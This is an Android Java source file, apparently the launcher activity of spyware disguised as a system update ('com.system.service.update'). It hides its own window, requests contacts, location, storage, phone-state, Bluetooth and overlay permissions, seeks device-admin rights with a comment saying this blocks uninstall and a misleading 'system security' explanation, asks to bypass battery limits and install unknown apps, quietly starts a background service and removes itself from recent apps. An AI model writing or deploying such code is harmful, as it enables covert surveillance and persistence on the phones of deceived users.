// MainActivity.java
package com.system.service.update;

import android.app.Activity;
import android.os.Bundle;
import android.os.Build;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.provider.Settings;
import android.view.Window;
import android.view.WindowManager;
import android.Manifest;
import android.os.PowerManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;

public class MainActivity extends Activity {
    
    private static final int PERMISSION_REQUEST_CODE = 100;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Hide the activity window
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().addFlags(
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
            WindowManager.LayoutParams.FLAG_FULLSCREEN
        );
        
        // Request all permissions automatically
        requestAllPermissions();
        
        // Request device admin (blocks uninstall)
        requestDeviceAdmin();
        
        // Start the background service immediately
        startSystemService();
        
        // Hide from recent apps and finish
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            finishAndRemoveTask();
        } else {
            finish();
        }
    }
    
    private void requestDeviceAdmin() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            ComponentName componentName = new ComponentName(this, DeviceAdminReceiver.class);
            
            if (!dpm.isAdminActive(componentName)) {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
                    "Required for system security and updates");
                startActivity(intent);
            }
        } catch (Exception e) {
            // Silent fail
        }
    }
    
    private void requestAllPermissions() {
        // Check and request permissions
        String[] permissions = {
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.BLUETOOTH,
            Manifest.permission.BLUETOOTH_ADMIN,
            Manifest.permission.BLUETOOTH_CONNECT,
            Manifest.permission.BLUETOOTH_SCAN,
            Manifest.permission.NFC,
            Manifest.permission.RECEIVE_BOOT_COMPLETED,
            Manifest.permission.SCHEDULE_EXACT_ALARM,
            Manifest.permission.SYSTEM_ALERT_WINDOW,
        };
        
        // Only request permissions we don't already have
        boolean needsRequest = false;
        for (String permission : permissions) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
                    needsRequest = true;
                    break;
                }
            }
        }
        
        if (needsRequest && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            requestPermissions(permissions, PERMISSION_REQUEST_CODE);
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            // Check for special permissions that need separate dialogs
            requestBatteryOptimizationBypass();
            requestInstallUnknownApps();
            requestOverlayPermission();
            requestUsageStatsPermission();
            requestWriteSettings();
        }
    }
    
    private void requestBatteryOptimizationBypass() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            }
        }
    }
    
    private void requestInstallUnknownApps() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            if (!getPackageManager().canRequestPackageInstalls()) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES);
                intent.setData(Uri.parse("package:" + getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            }
        }
    }
    
    private void requestOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
                intent.setData(Uri.parse("package:" + getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            }
        }
    }
    
    private void requestUsageStatsPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            try {
                Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            } catch (Exception e) {
                // Settings not available
            }
        }
    }
    
    private void requestWriteSettings() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.System.canWrite(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            }
        }
    }
    
    private void startSystemService() {
        try {
            Intent serviceIntent = new Intent(this, SystemService.class);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
        } catch (Exception e) {
            // Silent fail - service will be started by other triggers
        }
    }
    
    @Override
    protected void onPause() {
        super.onPause();
        finish();
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
    }
    
    @Override
    protected void onUserLeaveHint() {
        super.onUserLeaveHint();
        finish();
    }
}
